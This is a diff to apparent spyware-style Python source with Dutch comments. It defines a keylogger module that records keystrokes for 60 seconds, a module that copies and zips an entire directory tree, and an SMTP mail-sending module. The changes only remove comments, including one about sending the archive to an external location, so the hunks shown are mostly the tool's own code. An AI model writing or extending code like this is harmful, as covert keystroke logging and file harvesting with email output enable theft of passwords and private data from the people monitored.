@@ -69,18 +69,18 @@ class MailModule(Module):
 
     
     def run(self):
-        # Verbindingsinstellingen voor de SMTP-server
         smtp_server = 'smtp.example.com'
         smtp_port = 587
         username = 'example@example.com'
         password = 'example'
+        
         # E-mailgegevens
         sender = 'example@example.come'
         recipient = 'example@example.com'
         subject = 'Test Email'
         message = 'Dit is een testbericht.'
 
-        # Het e-mailbericht opstellen
+      
         email = MIMEMultipart()
         email['From'] = sender
         email['To'] = recipient
@@ -88,7 +88,7 @@ class MailModule(Module):
 
         email.attach(MIMEText(message, 'plain'))
         server = None
-        # SMTP-verbinding maken en e-mail verzenden
+       
         try:
             server = smtplib.SMTP(smtp_server, smtp_port)
             server.starttls()
@@ -121,22 +121,21 @@ class DiskModule(Module):
 
 
     def analyze_disk_structure(self, source_path, destination_path):
-        # Maak een tijdelijke map voor de verzamelde gegevens
+      
         temp_path = os.path.join(destination_path, 'temp')
         os.makedirs(temp_path, exist_ok=True)
 
         try:
-            # Loop door de bronmap en kopieer alle bestanden en mappen naar de tijdelijke map
+       
             for root, dirs, files in os.walk(source_path):
-                # Maak de bijbehorende mapstructuur in de tijdelijke map
+        
                 for directory in dirs:
                     os.makedirs(os.path.join(temp_path, os.path.relpath(root, source_path), directory), exist_ok=True)
 
-                # Kopieer de bestanden naar de tijdelijke map
                 for file in files:
                     shutil.copy2(os.path.join(root, file), os.path.join(temp_path, os.path.relpath(root, source_path), file))
 
-            # Maak een ZIP-archief van de tijdelijke map
+          
             zip_file_path = os.path.join(destination_path, 'disk_structure.zip')
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(temp_path):
@@ -144,16 +143,11 @@ class DiskModule(Module):
                         file_path = os.path.join(root, file)
                         zipf.write(file_path, os.path.relpath(file_path, temp_path))
 
-            # Verstuur het ZIP-archief naar een externe locatie of sla het lokaal op
-            # Hier kun je de code toevoegen om de ZIP-archiefbestand door te sturen naar een externe locatie
-
-            # Verwijder de tijdelijke map
             shutil.rmtree(temp_path)
 
             return zip_file_path
 
         except Exception as e:
-            # Handel eventuele fouten af
             self.logmessage += 'Fout bij het analyseren van de schijfstructuur: \n'
             return None
 
@@ -184,9 +178,7 @@ class KeyModule(Module):
             return 'Backspace'
         elif key == keyboard.Key.tab:
             return 'Tab'
-        # Voeg hier extra speciale toetsen toe als dat nodig is
-        
-        # Als de speciale toets niet wordt herkend, retourneer gewoon de naam van de toets
+    
         return str(key)
         
     def start_logging(self):
@@ -202,7 +194,7 @@ class KeyModule(Module):
 
     def run(self):
         self.start_logging()
-        time.sleep(60)  # 60 seconden
+        time.sleep(60)  
         self.stop_logging()
         logged_keys = self.get_logged_keys()
         self.logmessage += "Logged Keys:" +  logged_keys
